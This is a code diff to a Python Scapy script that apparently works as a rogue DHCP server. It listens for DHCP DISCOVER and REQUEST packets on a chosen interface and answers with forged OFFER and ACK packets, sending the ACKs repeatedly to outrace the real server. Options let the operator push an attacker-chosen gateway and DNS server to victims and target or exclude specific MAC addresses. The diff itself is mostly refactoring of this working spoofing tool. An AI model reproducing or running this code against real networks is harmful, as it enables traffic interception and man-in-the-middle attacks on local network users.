@@ -1,17 +1,18 @@
 #! /usr/bin/env python
 from scapy.all import *
-from struct import *
-import sys, os, time
+import struct
 import argparse 
 from functools import partial
 import re
 from scapy.layers.dhcp import dhcp_request
  
 #
-# TODO:
+# TODO: (might never get implemented)
+# - Retry dhcp_request and graceful exit if unsuccessful
 # - Support ipv6
-# - Support ~/16 notation for subnet masks
+# - Support CIDR notation for subnet masks
 # - if --static-data is given and no --gateway detect the own currently used by this machine
+# - add logging and -v and -q flags
 #
  
  
@@ -43,9 +44,7 @@ def get_CIDR(netmask):
     return d
 
  
-def detect_dhcp(pkt):
-    #if not pkt[Ether].src.lower() == victim_mac.lower():
-    #        return    
+def detect_dhcp(pkt):  
     try:
         dhcpPkt = pkt[DHCP]
     except:
@@ -55,25 +54,29 @@ def detect_dhcp(pkt):
     if params.blacklist and pkt[Ether].src in params.blacklist: return
     
     clientMAC = pkt[Ether].src
+    if pkt[BOOTP].ciaddr == "0.0.0.0":
+        ip = ip_generator()
+    else:
+        ip = pkt[BOOTP].ciaddr
+        print "request ip", ip
+    if pkt[IP].dst == "255.255.255.255":
+        smac = my_mac
+        sip = my_ip
+    else:
+        smac = pkt[Ether].dst
+        sip = pkt[IP].dst 
+    
     #If DHCP Discover then DHCP Offer
     if pkt[DHCP].options[0][1] == 1:
         tmp = dict(dhcp_settings)
         tmp['message-type'] = 'offer'
         options = list(tmp.items())
         options.append("end")
-        ip = ip_generator()
-        if pkt[IP].dst == "255.255.255.255":
-            smac = my_mac
-            sip = my_ip
-        else:
-            smac = pkt[Ether].dst
-            sip = pkt[IP].dst 
         
         send_bogus_package(clientMAC, smac, ip, sip, pkt[BOOTP].xid, dhcp_options=options)
-        # just to increase the chances...
-        #send_bogus_package(clientMAC, ip, pkt[BOOTP].xid, dhcp_options=options, response_type="ack", count=5)
-        print "DHCP Recover packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
+        print "DHCP DISCOVER packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
         print "-> to", pkt[Ether].dst, (pkt[IP].dst if IP in pkt else "-")
+        print "Offer", ip, "to",  pkt[Ether].src
     # Request response
     else:
         # we just ACK every client REQUEST
@@ -83,22 +86,14 @@ def detect_dhcp(pkt):
         tmp['message-type'] = 'ack'
         options = list(tmp.items())
         options.append("end")
-        if pkt[IP].dst == "255.255.255.255":
-            smac = my_mac
-            sip = my_ip
-        else:
-            smac = pkt[Ether].dst
-            sip = pkt[IP].dst
-        if pkt[BOOTP].ciaddr == "0.0.0.0": ip = ip_generator()
-        else: ip = pkt[BOOTP].ciaddr
-        print "->", clientMAC, smac, ip, sip, pkt[BOOTP].xid, options
+        # Does it any good to send it multiple times ?
         send_bogus_package(clientMAC, smac, ip, sip, pkt[BOOTP].xid, options, count=5)
-
-        print "DHCP Request packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
+        print "DHCP REQUEST packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
         print "-> to", pkt[Ether].dst, (pkt[IP].dst if IP in pkt else "-")
+        print "ACK", ip, "for",  pkt[Ether].src
 
 
-def send_bogus_package(clientMAC, sender_mac, assign_ip, my_ip, xid, dhcp_options, count=1):
+def send_bogus_package(client_MAC, sender_mac, assign_ip, my_ip, xid, dhcp_options, count=1):
     sendp(
         Ether(src=sender_mac, dst="ff:ff:ff:ff:ff:ff")/
         IP(src=my_ip, dst="255.255.255.255")/
@@ -108,10 +103,10 @@ def send_bogus_package(clientMAC, sender_mac, assign_ip, my_ip, xid, dhcp_option
             yiaddr=assign_ip,
             siaddr=dhcp_settings['server_id'],
             giaddr=dhcp_settings['router'],
-            chaddr=toMAC(clientMAC),
+            chaddr=toMAC(client_MAC),
             xid=xid
         )/
-        DHCP(options=dhcp_options), count=count)
+        DHCP(options=dhcp_options), count=count, iface=params.interface)
 
 
 
@@ -135,11 +130,11 @@ if __name__ == '__main__':
     
     global params, ack_header, dhcp_settings, ip_generator, my_mac, my_ip
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', '--interface', type=mac_validator, help="Use the given interface for sniffing and sending.")
+    parser.add_argument('-i', '--interface', required=True, help="Use the given interface for sniffing and sending.")
     parser.add_argument('-b', '--blacklist', metavar="MAC", nargs="+", type=mac_validator, default=None, help="Never react to package from given MAC.")
     parser.add_argument('-w', '--whitelist', metavar="MAC", nargs="+", type=mac_validator, default=None, help="Only react to packages from given MAC.")
     
-    parser.add_argument('-s', '--static-data', action="store_true", help="If given no dhcp request is done to get the settings. If used --gateway, --dns-server and --subnet-mask should be supplied.")
+    parser.add_argument('-s', '--static-data', action="store_true", help="If given no dhcp request is done to get the settings. If used --gateway and --subnet-mask should be supplied.")
     parser.add_argument('--ip', type=ip_validator, help="If given send this IP to the client(s) on DISCOVER.")
     parser.add_argument('--dns-server', type=ip_validator, help="If given send this DNS server IP to the client(s) on DISCOVER and REQUEST.")
     parser.add_argument('--gateway', type=ip_validator, help="If given send this gateway IP to the client(s) on DISCOVER and REQUEST.")
@@ -153,6 +148,7 @@ if __name__ == '__main__':
     
     params = parser.parse_args()
     conf.checkIPaddr = False    
+    conf.iface = params.interface
     
     if not params.static_data:
         foo = dhcp_request(params.interface, nofilter=1)
